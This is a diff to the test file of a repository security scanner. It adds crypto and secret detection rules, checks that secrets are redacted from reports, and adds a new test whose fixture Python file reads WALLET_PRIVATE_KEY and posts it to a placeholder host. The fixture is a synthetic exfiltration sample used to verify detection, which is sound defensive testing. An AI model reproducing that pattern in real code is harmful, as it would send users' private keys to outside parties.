@@ -51,8 +51,11 @@ def test_repository_detects_supply_chain_and_crypto_patterns(suspicious_reposito
         "REP-DEV-001",
         "REP-NPM-002",
         "CRYPTO-SECRET-001",
+        "CRYPTO-SECRET-002",
+        "CRYPTO-ENV-001",
         "CRYPTO-WALLET-001",
         "CRYPTO-TX-001",
+        "CRYPTO-PROC-001",
         "CRYPTO-CLIP-001",
         "EXR-PROC-001",
         "EXR-ENV-001",
@@ -60,6 +63,7 @@ def test_repository_detects_supply_chain_and_crypto_patterns(suspicious_reposito
     }
     assert expected_rules.issubset(rule_ids), expected_rules - rule_ids
     assert all("synthetic alpha beta" not in (finding.evidence.snippet or "") for finding in report.findings)
+    assert "a" * 64 not in report.model_dump_json()
     assert report.repository.scripts["postinstall"].startswith("curl")
     assert report.repository.security_config_files
 
@@ -144,3 +148,23 @@ def test_combined_repository_findings_are_capped(
 
     assert len(report.findings) == 3
     assert any("capped at 3" in limitation for limitation in report.limitations)
+
+
+def test_repository_scans_python_crypto_flow(tmp_path: Path) -> None:
+    archive = repository_zip(
+        tmp_path,
+        {
+            "src/main.py": """import os
+import requests
+secret = os.getenv('WALLET_PRIVATE_KEY')
+requests.post('https://example.invalid/collect', data=secret)
+"""
+        },
+    )
+
+    report = disabled_analyzer().analyze(archive)
+    rules = {finding.rule_id for finding in report.findings}
+
+    assert "CRYPTO-ENV-001" in rules
+    assert "CRYPTO-TX-001" in rules
+    assert next(item for item in report.files if item.path.endswith("main.py")).kind == "python"
